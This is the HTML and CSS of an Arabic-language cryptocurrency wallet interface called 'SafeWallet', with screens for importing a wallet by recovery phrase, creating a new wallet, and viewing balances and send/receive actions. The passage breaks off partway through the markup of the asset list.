
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SafeWallet - محفظة آمنة</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        /* إعادة تعيين الأنماط الأساسية */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* المتغيرات العامة */
        :root {
            /* الألوان الأساسية - مستوحاة من SafePal */
            --primary-color: #1652f0;
            --primary-dark: #0d47d9;
            --secondary-color: #00d4aa;
            --accent-color: #ff6b35;
            --success-color: #00c896;
            --warning-color: #ffb020;
            --error-color: #ff4757;
            
            /* ألوان الخلفية */
            --bg-primary: #0f0f23;
            --bg-secondary: #1a1a3a;
            --bg-tertiary: #252547;
            --bg-card: #1e1e3f;
            --bg-modal: #2a2a4a;
            
            /* ألوان النص */
            --text-primary: #ffffff;
            --text-secondary: #b8bcc8;
            --text-muted: #8b8ca7;
            --text-inverse: #0f0f23;
            
            /* ألوان الحدود */
            --border-color: #3a3a5c;
            --border-light: #4a4a6c;
            
            /* الظلال */
            --shadow-sm: 0 2px 4px rgba(0, 0, 0, 0.1);
            --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.15);
            --shadow-lg: 0 8px 24px rgba(0, 0, 0, 0.2);
            --shadow-xl: 0 16px 48px rgba(0, 0, 0, 0.3);
            
            /* المسافات */
            --spacing-xs: 4px;
            --spacing-sm: 8px;
            --spacing-md: 16px;
            --spacing-lg: 24px;
            --spacing-xl: 32px;
            --spacing-2xl: 48px;
            
            /* أحجام الخط */
            --font-xs: 12px;
            --font-sm: 14px;
            --font-md: 16px;
            --font-lg: 18px;
            --font-xl: 20px;
            --font-2xl: 24px;
            --font-3xl: 32px;
            
            /* الانتقالات */
            --transition-fast: 0.15s ease;
            --transition-normal: 0.3s ease;
            --transition-slow: 0.5s ease;
        }

        /* الخطوط */
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
            direction: rtl;
            overflow-x: hidden;
        }

        /* الحاوي الرئيسي */
        .app-container {
            min-height: 100vh;
            position: relative;
        }

        /* الشاشات */
        .screen {
            display: none;
            min-height: 100vh;
            padding: var(--spacing-lg);
            animation: fadeIn 0.4s ease;
        }

        .screen.active {
            display: block;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* شاشة الترحيب */
        .welcome-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
            max-width: 400px;
            margin: 0 auto;
        }

        .logo-section {
            margin-bottom: var(--spacing-2xl);
        }

        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto var(--spacing-lg);
            box-shadow: var(--shadow-lg);
            position: relative;
            overflow: hidden;
        }

        .logo::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            transform: rotate(45deg);
            animation: shimmer 3s infinite;
        }

        @keyframes shimmer {
            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
        }

        .logo i {
            font-size: 36px;
            color: white;
            z-index: 1;
        }

        .welcome-container h1 {
            font-size: var(--font-3xl);
            font-weight: 700;
            margin-bottom: var(--spacing-sm);
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .tagline {
            color: var(--text-secondary);
            font-size: var(--font-lg);
            margin-bottom: var(--spacing-2xl);
        }

        .welcome-actions {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: var(--spacing-md);
            margin-bottom: var(--spacing-xl);
        }

        .security-note {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            color: var(--text-muted);
            font-size: var(--font-sm);
        }

        .security-note i {
            color: var(--success-color);
        }

        /* الأزرار */
        .btn {
            padding: var(--spacing-md) var(--spacing-lg);
            border: none;
            border-radius: 12px;
            font-size: var(--font-md);
            font-weight: 600;
            cursor: pointer;
            transition: all var(--transition-normal);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: var(--spacing-sm);
            text-decoration: none;
            position: relative;
            overflow: hidden;
            min-height: 48px;
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
            color: white;
            box-shadow: var(--shadow-md);
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-lg);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn-secondary {
            background: var(--bg-card);
            color: var(--text-primary);
            border: 2px solid var(--border-color);
            box-shadow: var(--shadow-sm);
        }

        .btn-secondary:hover {
            border-color: var(--primary-color);
            background: var(--bg-tertiary);
            transform: translateY(-1px);
        }

        .btn-full {
            width: 100%;
        }

        /* رؤوس الشاشات */
        .screen-header {
            display: flex;
            align-items: center;
            margin-bottom: var(--spacing-xl);
            gap: var(--spacing-md);
        }

        .back-btn {
            width: 40px;
            height: 40px;
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all var(--transition-fast);
        }

        .back-btn:hover {
            background: var(--bg-tertiary);
            border-color: var(--primary-color);
        }

        .screen-header h2 {
            font-size: var(--font-2xl);
            font-weight: 600;
            color: var(--text-primary);
        }

        /* شاشة الاستيراد */
        .import-container {
            max-width: 500px;
            margin: 0 auto;
        }

        .import-form {
            background: var(--bg-card);
            border-radius: 16px;
            padding: var(--spacing-xl);
            margin-bottom: var(--spacing-lg);
            box-shadow: var(--shadow-md);
        }

        .form-section {
            margin-bottom: var(--spacing-xl);
        }

        .form-section label {
            display: block;
            font-weight: 600;
            margin-bottom: var(--spacing-sm);
            color: var(--text-primary);
        }

        #mnemonicInput {
            width: 100%;
            padding: var(--spacing-md);
            background: var(--bg-tertiary);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: var(--font-md);
            resize: vertical;
            min-height: 120px;
            transition: border-color var(--transition-fast);
        }

        #mnemonicInput:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
        }

        .input-hint {
            display: flex;
            align-items: center;
            gap: var(--spacing-xs);
            margin-top: var(--spacing-sm);
            color: var(--text-muted);
            font-size: var(--font-sm);
        }

        .security-warning {
            background: rgba(255, 107, 53, 0.1);
            border: 1px solid var(--accent-color);
            border-radius: 12px;
            padding: var(--spacing-md);
            display: flex;
            gap: var(--spacing-md);
            align-items: flex-start;
        }

        .security-warning i {
            color: var(--accent-color);
            margin-top: 2px;
        }

        .security-warning strong {
            color: var(--accent-color);
        }

        /* شاشة إنشاء المحفظة */
        .create-container {
            max-width: 600px;
            margin: 0 auto;
        }

        .wallet-info-card {
            background: var(--bg-card);
            border-radius: 16px;
            padding: var(--spacing-xl);
            margin-bottom: var(--spacing-lg);
            box-shadow: var(--shadow-md);
        }

        .info-section {
            margin-bottom: var(--spacing-lg);
        }

        .info-section:last-child {
            margin-bottom: 0;
        }

        .info-section label {
            display: block;
            font-weight: 600;
            margin-bottom: var(--spacing-sm);
            color: var(--text-secondary);
            font-size: var(--font-sm);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .address-display {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            background: var(--bg-tertiary);
            padding: var(--spacing-md);
            border: 1px solid var(--border-color);
            border-radius: 8px;
        }

        .address-display span {
            flex: 1;
            font-family: 'Courier New', monospace;
            font-size: var(--font-sm);
            word-break: break-all;
            color: var(--text-primary);
        }

        .mnemonic-display {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            position: relative;
        }

        .mnemonic-words {
            padding: var(--spacing-md);
            font-family: 'Courier New', monospace;
            font-size: var(--font-sm);
            line-height: 1.8;
            color: var(--text-primary);
            min-height: 80px;
            display: flex;
            align-items: center;
        }

        .copy-btn {
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 6px;
            padding: var(--spacing-sm);
            cursor: pointer;
            transition: background-color var(--transition-fast);
            min-width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .copy-btn:hover {
            background: var(--primary-dark);
        }

        .backup-warning {
            background: rgba(0, 200, 150, 0.1);
            border: 1px solid var(--success-color);
            border-radius: 12px;
            padding: var(--spacing-md);
            display: flex;
            gap: var(--spacing-md);
            align-items: flex-start;
            margin-bottom: var(--spacing-lg);
        }

        .backup-warning i {
            color: var(--success-color);
            margin-top: 2px;
        }

        .backup-warning strong {
            color: var(--success-color);
        }

        /* شاشة المحفظة الرئيسية */
        .wallet-container {
            max-width: 800px;
            margin: 0 auto;
        }

        .wallet-header {
            margin-bottom: var(--spacing-xl);
        }

        .wallet-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--bg-card);
            border-radius: 16px;
            padding: var(--spacing-lg);
            box-shadow: var(--shadow-md);
        }

        .wallet-name h3 {
            font-size: var(--font-xl);
            margin-bottom: var(--spacing-xs);
        }

        .wallet-address-short {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
        }

        .wallet-address-short span {
            font-family: 'Courier New', monospace;
            color: var(--text-secondary);
            font-size: var(--font-sm);
        }

        .copy-btn-small {
            background: transparent;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            color: var(--text-secondary);
            padding: var(--spacing-xs);
            cursor: pointer;
            transition: all var(--transition-fast);
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .copy-btn-small:hover {
            border-color: var(--primary-color);
            color: var(--primary-color);
        }

        .settings-btn {
            background: transparent;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-secondary);
            padding: var(--spacing-sm);
            cursor: pointer;
            transition: all var(--transition-fast);
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .settings-btn:hover {
            border-color: var(--primary-color);
            color: var(--primary-color);
            background: rgba(22, 82, 240, 0.1);
        }

        /* قسم الرصيد */
        .balance-section {
            margin-bottom: var(--spacing-xl);
        }

        .balance-card {
            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
            border-radius: 20px;
            padding: var(--spacing-xl);
            text-align: center;
            position: relative;
            overflow: hidden;
            box-shadow: var(--shadow-lg);
        }

        .balance-card::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
            animation: pulse 4s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 0.5; }
            50% { transform: scale(1.1); opacity: 0.8; }
        }

        .balance-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: var(--spacing-md);
            position: relative;
            z-index: 1;
        }

        .balance-header span {
            color: rgba(255, 255, 255, 0.9);
            font-size: var(--font-sm);
            font-weight: 500;
        }

        .refresh-btn {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            border-radius: 6px;
            color: white;
            padding: var(--spacing-xs);
            cursor: pointer;
            transition: all var(--transition-fast);
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .refresh-btn:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: rotate(180deg);
        }

        .balance-amount {
            font-size: var(--font-3xl);
            font-weight: 700;
            color: white;
            margin-bottom: var(--spacing-sm);
            position: relative;
            z-index: 1;
        }

        .currency {
            font-size: var(--font-lg);
            opacity: 0.9;
        }

        .balance-usd {
            color: rgba(255, 255, 255, 0.8);
            font-size: var(--font-md);
            position: relative;
            z-index: 1;
        }

        /* الإجراءات السريعة */
        .quick-actions {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: var(--spacing-md);
            margin-bottom: var(--spacing-xl);
        }

        .action-btn {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: var(--spacing-lg);
            cursor: pointer;
            transition: all var(--transition-normal);
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: var(--spacing-sm);
            text-align: center;
            color: var(--text-primary);
            box-shadow: var(--shadow-sm);
        }

        .action-btn:hover {
            transform: translateY(-4px);
            box-shadow: var(--shadow-md);
            border-color: var(--primary-color);
        }

        .action-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            margin-bottom: var(--spacing-xs);
        }

        .action-icon.send {
            background: linear-gradient(135deg, var(--accent-color), #ff8c42);
            color: white;
        }

        .action-icon.receive {
            background: linear-gradient(135deg, var(--success-color), #00e6b8);
            color: white;
        }

        .action-icon.swap {
            background: linear-gradient(135deg, var(--secondary-color), #00f0cc);
            color: white;
        }

        .action-icon.buy {
            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
            color: white;
        }

        .action-btn span {
            font-size: var(--font-sm);
            font-weight: 500;
        }

        /* الأقسام */
        .assets-section,
        .transactions-section {
            margin-bottom: var(--spacing-xl);
        }

        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: var(--spacing-md);
        }

        .section-header h4 {
            font-size: var(--font-lg);
            font-weight: 600;
            color: var(--text-primary);
        }

        .add-btn,
        .view-all-btn {
            background: transparent;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-secondary);
            padding: var(--spacing-xs) var(--spacing-sm);
            cursor: pointer;
            transition: all var(--transition-fast);
            font-size: var(--font-sm);
        }

        .add-btn:hover,
        .view-all-btn:hover {
            border-color: var(--primary-color);
            color: var(--primary-color);
        }

        /* قائمة الأصول */
        .assets-list {
            background: var(--bg-card);
            border-radius: 12px;
            box-shadow: var(--shadow-sm);
        }

        .loading-assets {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: var(--spacing-md);
            padding: var(--spacing-xl);
            color: var(--text-secondary);
        }

        .asset-item {
            display: flex;
            align-items: center;
            padding: var(--spacing-md);
            border-bottom: 1px solid var(--border-color);
            transition: background-color var(--transition-fast);
        }

        .asset-item:hover {
            background: var(--bg-tertiary);
        }

        .asset-item:last-child {
            border-bottom: none;
        }

        .asset-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-left: var(--spacing-md);
            color: white;
            font-weight: 600;
            font-size: var(--font-sm);
        }

        .asset-details {
            flex: 1;
        }

        .asset-details h5 {
            font-size: var(--font-md);
            margin-bottom: 2px;
            color: var(--text-primary);
        }

        .asset-details p {
            font-size: var(--font-sm);
            color: var(--text-secondary);
        }

        .asset-balance {
            text-align: left;
            font-weight: 600;
            color: var(--text-primary);
        }

        /* قائمة المعاملات */
        .transactions-list {
            background: var(--bg-card);
            border-radius: 12px;
            box-shadow: var(--shadow-sm);
        }

        .no-transactions {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: var(--spacing-sm);
            padding: var(--spacing-xl);
            color: var(--text-muted);
        }

        .no-transactions i {
            font-size: var(--font-2xl);
            opacity: 0.5;
        }

        /* النوافذ المنبثقة */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            backdrop-filter: blur(4px);
        }

        .modal.active {
            display: flex;
            align-items: center;
            justify-content: center;
            animation: modalFadeIn 0.3s ease;
        }

        @keyframes modalFadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .modal-content {
            background: var(--bg-modal);
            border-radius: 16px;
            max-width: 500px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: var(--shadow-xl);
            animation: modalSlideIn 0.3s ease;
        }

        @keyframes modalSlideIn {
            from {
                transform: translateY(-50px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: var(--spacing-lg);
            border-bottom: 1px solid var(--border-color);
        }

        .modal-header h3 {
            font-size: var(--font-xl);
            color: var(--text-primary);
        }

        .close-btn {
            background: transparent;
            border: none;
            border-radius: 6px;
            color: var(--text-secondary);
            font-size: var(--font-lg);
            cursor: pointer;
            padding: var(--spacing-xs);
            transition: color var(--transition-fast);
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .close-btn:hover {
            color: var(--text-primary);
        }

        .modal-body {
            padding: var(--spacing-lg);
        }

        /* نماذج الإدخال */
        .form-group {
            margin-bottom: var(--spacing-lg);
        }

        .form-group label {
            display: block;
            font-weight: 600;
            margin-bottom: var(--spacing-sm);
            color: var(--text-primary);
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: var(--spacing-md);
            background: var(--bg-tertiary);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: var(--font-md);
            transition: border-color var(--transition-fast);
        }

        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
        }

        .input-with-scan {
            display: flex;
            gap: var(--spacing-sm);
        }

        .input-with-scan input {
            flex: 1;
        }

        .scan-btn {
            background: var(--bg-tertiary);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-secondary);
            padding: var(--spacing-md);
            cursor: pointer;
            transition: all var(--transition-fast);
            width: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .scan-btn:hover {
            border-color: var(--primary-color);
            color: var(--primary-color);
        }

        .amount-input {
            display: flex;
            gap: var(--spacing-sm);
        }

        .amount-input input {
            flex: 1;
        }

        .amount-input select {
            width: 80px;
        }

        /* خيارات الغاز */
        .gas-options {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: var(--spacing-sm);
        }

        .gas-option {
            background: var(--bg-tertiary);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            padding: var(--spacing-md);
            cursor: pointer;
            transition: all var(--transition-fast);
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: var(--spacing-xs);
            color: var(--text-primary);
        }

        .gas-option:hover {
            border-color: var(--primary-color);
        }

        .gas-option.active {
            border-color: var(--primary-color);
            background: rgba(22, 82, 240, 0.1);
        }

        .gas-price {
            font-size: var(--font-xs);
            color: var(--text-secondary);
        }

        /* نافذة الاستقبال */
        .receive-content {
            text-align: center;
        }

        .qr-section {
            margin-bottom: var(--spacing-lg);
        }

        .qr-code {
            width: 200px;
            height: 200px;
            background: white;
            border-radius: 12px;
            margin: 0 auto var(--spacing-md);
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: var(--shadow-md);
        }

        .address-section {
            margin-bottom: var(--spacing-lg);
        }

        .receive-warning {
            background: rgba(255, 182, 32, 0.1);
            border: 1px solid var(--warning-color);
            border-radius: 8px;
            padding: var(--spacing-md);
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            font-size: var(--font-sm);
            color: var(--warning-color);
        }

        /* نافذة الإعدادات */
        .settings-list {
            display: flex;
            flex-direction: column;
            gap: 1px;
            background: var(--border-color);
            border-radius: 8px;
            overflow: hidden;
        }

        .setting-item {
            background: var(--bg-tertiary);
            padding: var(--spacing-md);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .setting-item.danger {
            background: rgba(255, 71, 87, 0.1);
        }

        .setting-info {
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
            color: var(--text-primary);
        }

        .setting-item.danger .setting-info {
            color: var(--error-color);
        }

        .setting-btn {
            background: transparent;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-secondary);
            padding: var(--spacing-sm);
            cursor: pointer;
            transition: all var(--transition-fast);
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .setting-btn:hover {
            border-color: var(--primary-color);
            color: var(--primary-color);
        }

        .setting-btn.danger {
            border-color: var(--error-color);
            color: var(--error-color);
        }

        .setting-btn.danger:hover {
            background: var(--error-color);
            color: white;
        }

        /* شاشة التحميل */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(15, 15, 35, 0.9);
            z-index: 2000;
            backdrop-filter: blur(4px);
        }

        .loading-overlay.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .loading-content {
            text-align: center;
            color: var(--text-primary);
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid var(--border-color);
            border-top: 3px solid var(--primary-color);
            border-radius: 50%;
            margin: 0 auto var(--spacing-md);
            animation: spin 1s linear infinite;
        }

        .loading-spinner.large {
            width: 60px;
            height: 60px;
            border-width: 4px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* رسائل التنبيه */
        .toast-container {
            position: fixed;
            top: var(--spacing-lg);
            right: var(--spacing-lg);
            z-index: 3000;
            display: flex;
            flex-direction: column;
            gap: var(--spacing-sm);
        }

        .toast {
            background: var(--bg-modal);
            color: var(--text-primary);
            border-radius: 8px;
            padding: var(--spacing-md) var(--spacing-lg);
            box-shadow: var(--shadow-lg);
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            min-width: 300px;
            animation: toastSlideIn 0.3s ease;
        }

        @keyframes toastSlideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        @keyframes toastSlideOut {
            from {
                transform: translateX(0);
                opacity: 1;
            }
            to {
                transform: translateX(100%);
                opacity: 0;
            }
        }

        .toast.success {
            border-right: 4px solid var(--success-color);
        }

        .toast.error {
            border-right: 4px solid var(--error-color);
        }

        .toast.warning {
            border-right: 4px solid var(--warning-color);
        }

        .toast.info {
            border-right: 4px solid var(--primary-color);
        }

        /* التصميم المتجاوب */
        @media (max-width: 768px) {
            .screen {
                padding: var(--spacing-md);
            }
            
            .welcome-container {
                padding: var(--spacing-md);
            }
            
            .logo {
                width: 60px;
                height: 60px;
            }
            
            .logo i {
                font-size: 28px;
            }
            
            .welcome-container h1 {
                font-size: var(--font-2xl);
            }
            
            .quick-actions {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .action-icon {
                width: 40px;
                height: 40px;
                font-size: 18px;
            }
            
            .balance-amount {
                font-size: var(--font-2xl);
            }
            
            .wallet-info {
                flex-direction: column;
                gap: var(--spacing-md);
                text-align: center;
            }
            
            .modal-content {
                width: 95%;
                margin: var(--spacing-md);
            }
            
            .gas-options {
                grid-template-columns: 1fr;
            }
            
            .toast-container {
                right: var(--spacing-md);
                left: var(--spacing-md);
            }
            
            .toast {
                min-width: auto;
            }
        }

        @media (max-width: 480px) {
            .screen {
                padding: var(--spacing-sm);
            }
            
            .welcome-actions {
                gap: var(--spacing-sm);
            }
            
            .btn {
                padding: var(--spacing-sm) var(--spacing-md);
                font-size: var(--font-sm);
            }
            
            .quick-actions {
                gap: var(--spacing-sm);
            }
            
            .action-btn {
                padding: var(--spacing-md);
            }
            
            .balance-card {
                padding: var(--spacing-lg);
            }
            
            .wallet-info {
                padding: var(--spacing-md);
            }
            
            .modal-body {
                padding: var(--spacing-md);
            }
            
            .form-group {
                margin-bottom: var(--spacing-md);
            }
        }

        /* تحسينات إضافية للأداء */
        * {
            -webkit-tap-highlight-color: transparent;
        }

        button, .btn {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        /* تأثيرات التمرير */
        .screen {
            scroll-behavior: smooth;
        }

        /* تحسين الخطوط */
        body {
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            text-rendering: optimizeLegibility;
        }
    </style>
</head>
<body>
    <div class="app-container">
        <!-- شاشة الترحيب -->
        <div id="welcomeScreen" class="screen active">
            <div class="welcome-container">
                <div class="logo-section">
                    <div class="logo">
                        <i class="fas fa-shield-alt"></i>
                    </div>
                    <h1>SafeWallet</h1>
                    <p class="tagline">محفظتك الآمنة للعملات الرقمية</p>
                </div>
                
                <div class="welcome-actions">
                    <button id="importWalletBtn" class="btn btn-primary">
                        <i class="fas fa-download"></i>
                        استيراد محفظة موجودة
                    </button>
                    <button id="createWalletBtn" class="btn btn-secondary">
                        <i class="fas fa-plus"></i>
                        إنشاء محفظة جديدة
                    </button>
                </div>
                
                <div class="security-note">
                    <i class="fas fa-lock"></i>
                    <span>محفظتك آمنة ومشفرة بالكامل</span>
                </div>
            </div>
        </div>

        <!-- شاشة استيراد المحفظة -->
        <div id="importScreen" class="screen">
            <div class="import-container">
                <div class="screen-header">
                    <button id="backToWelcomeBtn" class="back-btn">
                        <i class="fas fa-arrow-right"></i>
                    </button>
                    <h2>استيراد محفظة</h2>
                </div>
                
                <div class="import-form">
                    <div class="form-section">
                        <label for="mnemonicInput">عبارة الاسترجاع</label>
                        <textarea 
                            id="mnemonicInput" 
                            placeholder="أدخل عبارة الاسترجاع المكونة من 12 أو 24 كلمة..."
                            rows="4"
                        ></textarea>
                        <div class="input-hint">
                            <i class="fas fa-info-circle"></i>
                            أدخل الكلمات مفصولة بمسافات
                        </div>
                    </div>
                    
                    <button id="importBtn" class="btn btn-primary btn-full">
                        <i class="fas fa-key"></i>
                        استيراد المحفظة
                    </button>
                </div>
                
                <div class="security-warning">
                    <i class="fas fa-exclamation-triangle"></i>
                    <div>
                        <strong>تحذير أمني:</strong>
                        <p>تأكد من أنك في مكان آمن وأن لا أحد يراقب شاشتك</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- شاشة إنشاء المحفظة -->
        <div id="createScreen" class="screen">
            <div class="create-container">
                <div class="screen-header">
                    <button id="backToWelcomeFromCreateBtn" class="back-btn">
                        <i class="fas fa-arrow-right"></i>
                    </button>
                    <h2>إنشاء محفظة جديدة</h2>
                </div>
                
                <div class="wallet-info-card">
                    <div class="info-section">
                        <label>عنوان المحفظة</label>
                        <div class="address-display">
                            <span id="newWalletAddress">جاري الإنشاء...</span>
                            <button id="copyAddressBtn" class="copy-btn">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                    
                    <div class="info-section">
                        <label>عبارة الاسترجاع</label>
                        <div class="mnemonic-display">
                            <div id="newWalletMnemonic" class="mnemonic-words">
                                جاري الإنشاء...
                            </div>
                            <button id="copyMnemonicBtn" class="copy-btn">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                </div>
                
                <div class="backup-warning">
                    <i class="fas fa-shield-alt"></i>
                    <div>
                        <strong>احفظ عبارة الاسترجاع بأمان!</strong>
                        <p>هذه هي الطريقة الوحيدة لاستعادة محفظتك. احفظها في مكان آمن ولا تشاركها مع أحد.</p>
                    </div>
                </div>
                
                <div class="create-actions">
                    <button id="continueToWalletBtn" class="btn btn-primary btn-full">
                        <i class="fas fa-arrow-left"></i>
                        متابعة إلى المحفظة
                    </button>
                </div>
            </div>
        </div>

        <!-- شاشة المحفظة الرئيسية -->
        <div id="walletScreen" class="screen">
            <div class="wallet-container">
                <!-- رأس المحفظة -->
                <div class="wallet-header">
                    <div class="wallet-info">
                        <div class="wallet-name">
                            <h3>محفظتي</h3>
                            <div class="wallet-address-short">
                                <span id="currentWalletAddress">0x0000...0000</span>
                                <button id="copyCurrentAddressBtn" class="copy-btn-small">
                                    <i class="fas fa-copy"></i>
                                </button>
                            </div>
                        </div>
                        <button id="settingsBtn" class="settings-btn">
                            <i class="fas fa-cog"></i>
                        </button>
                    </div>
                </div>

                <!-- قسم الرصيد -->
                <div class="balance-section">
                    <div class="balance-card">
                        <div class="balance-header">
                            <span>إجمالي الرصيد</span>
                            <button id="refreshBalanceBtn" class="refresh-btn">
                                <i class="fas fa-sync-alt"></i>
                            </button>
                        </div>
                        <div class="balance-amount">
                            <span id="totalBalance">0.00</span>
                            <span class="currency">ETH</span>
                        </div>
                        <div class="balance-usd">
                            <span id="balanceUSD">$0.00 USD</span>
                        </div>
                    </div>
                </div>

                <!-- أزرار الإجراءات السريعة -->
                <div class="quick-actions">
                    <button id="sendBtn" class="action-btn">
                        <div class="action-icon send">
                            <i class="fas fa-arrow-up"></i>
                        </div>
                        <span>إرسال</span>
                    </button>
                    <button id="receiveBtn" class="action-btn">
                        <div class="action-icon receive">
                            <i class="fas fa-arrow-down"></i>
                        </div>
                        <span>استقبال</span>
                    </button>
                    <button id="swapBtn" class="action-btn">
                        <div class="action-icon swap">
                            <i class="fas fa-exchange-alt"></i>
                        </div>
                        <span>تبديل</span>
                    </button>
                    <button id="buyBtn" class="action-btn">
                        <div class="action-icon buy">
                            <i class="fas fa-credit-card"></i>
                        </div>
                        <span>شراء</span>
                    </button>
                </div>

                <!-- قائمة الأصول -->
                <div class="assets-section">
                    <div class="section-header">
                        <h4>الأصول</h4>
                        <button id="addTokenBtn" class="add-btn">
                            <i class="fas fa-plus"></i>
                        </button>
                    </div>
                    <div id="assetsList" class="assets-list">
                        <div class="loading-assets">
                            <div class="loading-spinner"></div>
                            <span>جاري تحميل الأصول...</span>
                        </div>
